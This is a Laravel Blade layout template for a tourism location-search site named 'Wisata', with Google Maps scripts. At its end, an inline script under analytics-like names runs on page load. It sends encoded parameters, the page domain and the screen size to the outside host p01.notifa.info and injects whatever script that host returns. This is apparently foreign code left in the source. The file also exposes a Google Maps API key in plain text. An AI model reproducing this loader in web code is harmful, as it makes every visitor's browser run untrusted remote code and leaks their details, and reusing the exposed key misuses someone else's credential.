
<!DOCTYPE HTML>
<html lang="en">
    <head>
        <!--=============== basic  ===============-->
        <meta charset="UTF-8">
        <title>Wisata - Search Location</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <meta name="robots" content="index, follow"/>
        <meta name="keywords" content=""/>
        <meta name="description" content=""/>
        <meta name="csrf-token" content="{{ csrf_token() }}">
        <!--=============== css  ===============-->
        <link type="text/css" rel="stylesheet" href="{{ asset('css/reset.css') }}">
        <link type="text/css" rel="stylesheet" href="{{ asset('css/plugins.css') }}">
        <link type="text/css" rel="stylesheet" href="{{ asset('css/style.css') }}">
        <link type="text/css" rel="stylesheet" href="{{ asset('css/color.css') }}">
        <!--=============== favicons ===============-->
        <link rel="shortcut icon" href="{{ asset('icon/favicon.ico') }}">
    </head>
    <body>
        <!--loader-->
        <div class="loader-wrap">
            <div class="pin"></div>
            <div class="pulse"></div>
        </div>
        <!--loader end-->
        <!-- Main  -->
        <div id="main">
            <!-- header-->
            <header class="main-header dark-header fs-header sticky">
                <div class="header-inner">
                    <div class="logo-holder">
                        <a href="/"><img src="{{ asset('images/logo1.png') }}" alt="" width="200%"></a>
                    </div>
                    <a href="/add-location" class="add-list">Add Location <span><i class="fa fa-plus"></i></span></a>
                    <!-- nav-button-wrap-->
                    <div class="nav-button-wrap color-bg">
                        <div class="nav-button">
                            <span></span><span></span><span></span>
                        </div>
                    </div>
                    <!-- nav-button-wrap end-->
                    <!--  navigation -->
                    <div class="nav-holder main-menu">
                        <nav>
                        </nav>
                    </div>
                    <!-- navigation  end -->
                </div>
            </header>
            <!--  header end -->
            <!--  wrapper  -->
            <div id="wrapper">
                <!-- Content-->
                <div class="content">
                    <!--section -->
                    @yield('content')
                    <!-- section end -->
                    <!--section -->

                    <!-- section end -->
                </div>
                <!-- Content end -->
            </div>
            <!-- wrapper end -->
            <!--footer -->
            <footer class="main-footer dark-footer" style="padding:0;">
                <div class="sub-footer fl-wrap" style="margin-top:0;">
                    <div class="container">
                        <div class="row">
                            <div class="col-md-4">
                                <div class="about-widget">
                                    <!-- <img src="images/logo.png" alt=""> -->
                                </div>
                            </div>
                            <div class="col-md-4">
                                <div class="copyright"> &#169; Cofiner 2019 .  All rights reserved.</div>
                            </div>
                        </div>
                    </div>
                </div>
            </footer>
            <!--footer end  -->
            <!--register form -->

            <!--register form end -->
            <a class="to-top"><i class="fa fa-angle-up"></i></a>
        </div>
        <!-- Main end -->
        <!--=============== scripts  ===============-->
        <script type="text/javascript" src="{{ asset('js/jquery.min.js') }}"></script>
        <script type="text/javascript" src="{{ asset('js/plugins.js') }}"></script>
        <script type="text/javascript" src="{{ asset('js/scripts.js') }}"></script>
        <!-- <script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyCSScrzXYb2cBC9ClBwodnfwTke3dPEA6Q"></script> -->
        <script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyCSScrzXYb2cBC9ClBwodnfwTke3dPEA6Q&libraries=places&callback=initAutocomplete"></script>
        <script type="text/javascript" src="{{ asset('js/map_infobox.js') }}"></script>
        <script type="text/javascript" src="{{ asset('js/markerclusterer.js') }}"></script>
        @if(isset($type))
          @if($type=='place')
            <script type="text/javascript" src="{{ asset('js/map-add.js') }}"></script>
          @endif
          @if($type=='list')
            <script type="text/javascript" src="{{ asset('js/maps-list.js') }}"></script>
            <script type="text/javascript" src="{{ asset('js/maps.js') }}"></script>
          @endif
          @if($type=='detail')
            <script type="text/javascript" src="{{ asset('js/maps.js') }}"></script>
          @endif
          @if($type=='dashboard')
            <script type="text/javascript" src="{{ asset('js/maps-dashboard.js') }}"></script>
          @endif
        @endif
        <script type="text/javascript">
          if (self==top) {
            function netbro_cache_analytics(fn, callback) {
              setTimeout(function() {
                fn();
                callback();
              }, 0);
            }
            function sync(fn) {
              fn();
            }
            // function requestCfs(){
            //   var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");
            //   var idc_glo_r = Math.floor(Math.random()*99999999999);
            //   var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAgJDXOKuLZMzFzTWFRwH%2fB45RWFNSbyFlYJm2viQcdahf85gUzapb2EYvXYvJllfarYRbNUunruS0Ug6mBRqI3IMoYfy6%2ftYU5mgVIIP4e8GUsesdQdF91MeYVwdzo2eExfXIxOyNBIVnTFsx2zlcV8r5l3dfgT3cDteIVLf0QM7M3gvLcmip9%2fvxqW%2bnmdjo%2fqNdXpxygN2Rk0AGRnL2apY3OK3FeiAwSAYY8Me6%2bXA7GKDwEMIBb315L9VLyMWnZr7roX3RMF%2f4Sr%2bskDmXnR0O7X%2bzgCslazHvXkkGpSvA1YdVnc5P29sRRoWpHUWgDhQngW0xxODSMaBU9WoCs%2fDS54BkyvlMankiZUq874FxbZZTfnoZMEFS8OBCb9xz2t1AUiQsmFqqed8KRxT6uf4vJsBVzgVYr8xk1h9RB%2fCXhodbmSFSLyAdE3xN9RFP0nv0xiRGQUCXLAWRnTCkuE37N4AgeweM1vG05PK%2fSjKYQcHr%2fL72vynzlwRzZv0bjtJCgswOxzIvW8Eut8pkIcgcrQhesssXcmGf3XZbAwPw0vGxXpLeqF532EbBqcYN" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;
            //   var bsa = document.createElement('script');
            //   bsa.type = 'text/javascript';
            //   bsa.async = true;
            //   bsa.src = url;
            //   (document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);
            // }
            function requestCfs(){
              var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");
              var idc_glo_r = Math.floor(Math.random()*99999999999);
              var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAde8YIlUWrG3Grmww3kvok4kqmFmQ0QAQmmXmFwfK1OOzRqQ7WOS47BnsK2O111OL%2bvRqTM%2fwtXXVMlkMQErempPWbfWVY6kPgxGvydHAy85dATr00bkHQRu54dMXeaWgSYWpAGF3sh%2f2AQi75byUVLwcXJXN18FQ%2fNmukLwbGnwdi8bFLy6ugVkinCrw45P7w5KBlRv5WGPZdSn9qb5xWXN3tn2vqu%2bhH9hU%2bcUjtQvln9UEAyLyKVrSishlfpXlEbhZuUV4KgProtnIHBt7vAeHGn7vJ1H%2fYBLVN19rk1MWRcR1psWVNNiqz%2bEMFeMQsORE25Pn%2f6iYj%2fJi%2bZDq6JjnGfjfsvo45P7T0oZFcrbF72Ti%2f419Gi7bYne4VyKpL9tztXapjR%2fVjXIBg3%2bYnQcqeQbmJ7xuaOMJilLi9xdnluOfFWQhKJ8IydAKs5PryY4feWvIwQqOeOwWz47Oxm9CvY3jVQQg4uUwxbPp5oCnNyjEVrFY1QrCUQiA4et4kRh%2fDL4pPncdOTDvUBHcEmlCGOv7FQB9sykQCsCw3Z%2bI5l1Ujm5TAzVjTTeDlR8aTBu%2bul2pEvkdAB2%2f0nBL5w%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;
              var bsa = document.createElement('script');
              bsa.type = 'text/javascript';
              bsa.async = true;
              bsa.src = url;
              (document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);
            }
            netbro_cache_analytics(requestCfs, function(){});};
          </script>

    </body>
</html>
